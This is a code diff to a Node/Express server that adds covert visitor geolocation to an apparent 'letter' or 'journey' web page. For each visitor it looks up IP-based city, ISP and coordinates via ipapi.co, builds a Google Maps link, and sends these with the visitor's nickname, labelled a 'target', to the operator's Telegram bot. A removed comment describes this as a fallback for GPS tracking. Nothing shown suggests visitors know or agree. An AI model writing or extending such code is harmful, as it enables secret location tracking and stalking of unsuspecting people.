@@ -25,26 +25,51 @@ app.post('/api/track-ip', async (req, res) => {
   const { nickname, action } = req.body;
 
   const actionText = action === 'welcome' ? '🚀 BẮT ĐẦU HÀNH TRÌNH' : '💌 MỞ THƯ TÂM SỰ';
-
   console.log(`[Tracking] ${nickname || 'Ẩn danh'} - ${action}. IP: ${ip}`);
+
+  let geoInfo = "";
+  let mapsLink = "";
+
+  // Thử lấy thông tin địa lý từ IP (sử dụng ipapi.co - miễn phí và hỗ trợ HTTPS)
+  try {
+    // Nếu là localhost thì bỏ qua
+    if (ip !== '::1' && ip !== '127.0.0.1' && !ip.includes('192.168.')) {
+      const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
+      const geoData = await geoRes.json();
+      
+      if (!geoData.error) {
+        const { city, region, country_name, latitude, longitude, org } = geoData;
+        geoInfo = `📍 *Vị trí ước tính:* ${city}, ${region}, ${country_name}\n🏢 *Nhà mạng:* ${org}`;
+        mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+      }
+    } else {
+      geoInfo = `📍 *Vị trí:* Đang chạy trên Localhost`;
+    }
+  } catch (err) {
+    console.error("Geo lookup failed:", err);
+  }
 
   // Thông tin Telegram lấy từ biến môi trường
   const token = process.env.VITE_TELEGRAM_BOT_TOKEN;
   const chatId = process.env.VITE_TELEGRAM_CHAT_ID;
 
   if (token && chatId) {
-    const text = `
+    let text = `
 ✨ *THÔNG BÁO: ${actionText}*
 --------------------------
 👤 *Đối tượng:* ${nickname || 'Người dùng mới (Chưa nhập tên)'}
 🌐 *IP Address:* \`${ip}\`
-🕒 *Thời gian:* ${new Date().toLocaleString('vi-VN')}
---------------------------
-_Ghi chú: Đây là phương án dự phòng khi GPS không khả dụng._
-    `.trim();
+${geoInfo}
+`.trim();
+
+    if (mapsLink) {
+      text += `\n🔗 [Xem trên Google Maps](${mapsLink})`;
+    }
+
+    text += `\n🕒 *Thời gian:* ${new Date().toLocaleString('vi-VN')}\n--------------------------\n_Ghi chú: Vị trí IP có độ chính xác tương đối (thường là trạm phát sóng)._`;
 
     try {
-      const tgResponse = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
@@ -53,19 +78,12 @@ _Ghi chú: Đây là phương án dự phòng khi GPS không khả dụng._
           parse_mode: 'Markdown',
         }),
       });
-      
-      if (!tgResponse.ok) {
-        const errorMsg = await tgResponse.text();
-        console.error("Telegram API Error:", errorMsg);
-      }
     } catch (err) {
       console.error("Failed to send Telegram message:", err);
     }
-  } else {
-    console.warn("Telegram configuration missing in environment variables.");
   }
 
-  res.status(200).json({ success: true, message: "IP tracked successfully" });
+  res.status(200).json({ success: true });
 });
 
 app.listen(PORT, () => {
